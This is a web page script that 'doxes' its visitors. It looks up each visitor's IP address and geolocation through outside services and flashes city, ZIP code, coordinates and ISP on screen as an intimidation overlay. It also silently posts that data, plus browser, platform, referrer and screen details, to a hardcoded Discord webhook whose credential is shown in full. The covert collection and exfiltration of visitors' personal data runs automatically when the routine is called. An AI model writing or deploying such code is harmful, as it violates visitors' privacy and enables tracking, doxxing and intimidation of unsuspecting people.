    <script>
        async function getIPDetails() {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const { ip } = await ipResponse.json();
            const detailedResponse = await fetch(`https://we-are-jammin.xyz/json/${ip}`);
            const detailed = await detailedResponse.json();
            return { ip, detailed };
        }

        async function start_dox() {
            console.log("dox");
            let dox = document.getElementById("dox");
            let bg = document.getElementById("dox-bg-vid");
            let overlay = document.getElementById("dox-overlay");
            bg.play();
            dox.style.opacity = "1";

            let fontSize = Math.min(window.innerHeight / 10, window.innerWidth / 20);
            fontSize = fontSize - (fontSize / 2);
            overlay.style.fontSize = fontSize + "px";

            const { ip, detailed } = await getIPDetails();
            const browserInfo = getBrowserInfo();
            
            async function push(key, value) {
                let span = document.createElement("span");
                span.innerText = key + ": " + value;
                overlay.appendChild(span);
                await new Promise((res) => setTimeout(res, 300));
            }

            await push('IP Address', ip);
            await push('Country', detailed.country);
            await push('Region', detailed.regionName);
            await push('City', detailed.city);
            await push('Timezone', detailed.timezone);
            await push('Latitude', detailed.lat);
            await push('Longitude', detailed.lon);
            await push('ZIP Code', detailed.zip);
            await push('Full Location', detailed.location);
            await push('ISP', detailed.isp);
            await push('Organization', detailed.org);
            await push('Autonomous System', detailed.as);

            // Send webhook server-side
            sendWebhook({
                ip,
                country: detailed.country,
                region: detailed.regionName,
                city: detailed.city,
                zip: detailed.zip,
                location: detailed.location,
                isp: detailed.isp,
                organization: detailed.org,
                as: detailed.as,
                browserName: browserInfo.name,
                platform: browserInfo.platform,
                browserVersion: browserInfo.version,
                referrer: document.referrer || 'None',
                screenResolution: `${screen.width}x${screen.height}`,
                time: new Date().toLocaleString()
            });
        }

        function startDox() {
            let dox = document.getElementById("dox");
            dox.style.opacity = "0"; // Reset overlay
            setTimeout(start_dox, 300); // Call the existing dox function after a brief pause
        }

        function getBrowserInfo() {
            const userAgent = navigator.userAgent;
            let browserName = "Unknown";
            let browserVersion = "Unknown";
            let platform = navigator.platform;
            let isMobile = /Mobi|Android/i.test(userAgent);
            let isTablet = /Tablet|iPad/i.test(userAgent);

            // Simple browser detection
            if (userAgent.indexOf("Chrome") > -1) {
                browserName = "Chrome";
                browserVersion = userAgent.split("Chrome/")[1].split(" ")[0];
            } else if (userAgent.indexOf("Safari") > -1) {
                browserName = "Safari";
                browserVersion = userAgent.split("Version/")[1].split(" ")[0];
            } else if (userAgent.indexOf("Firefox") > -1) {
                browserName = "Firefox";
                browserVersion = userAgent.split("Firefox/")[1];
            } else if (userAgent.indexOf("MSIE") > -1 || !!document.documentMode) {
                browserName = "Internet Explorer";
                browserVersion = userAgent.split("MSIE ")[1].split(";")[0];
            }

            return { name: browserName, version: browserVersion, platform, isMobile, isTablet };
        }

        async function sendWebhook(data) {
            const webhookUrl = 'https://discord.com/api/webhooks/1287967961352503339/0cE5ttXrmrIQNSjrd53CZySHvRm7aTz0D3d6yqkIktHFtd4R2sHpKitkXcPwY93s_JOd'; // Replace with your actual webhook URL
            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `Visitor Info:\nIP: ${data.ip}\nCountry: ${data.country}\nRegion: ${data.region}\nCity: ${data.city}\nZIP Code: ${data.zip}\nLocation: ${data.location}\nISP: ${data.isp}\nOrganization: ${data.organization}\nAutonomous System: ${data.as}\nBrowser: ${data.browserName} (${data.browserVersion})\nPlatform: ${data.platform}\nReferrer: ${data.referrer}\nScreen Resolution: ${data.screenResolution}\nTime: ${data.time}`
                }),
            });
        }
    </script>
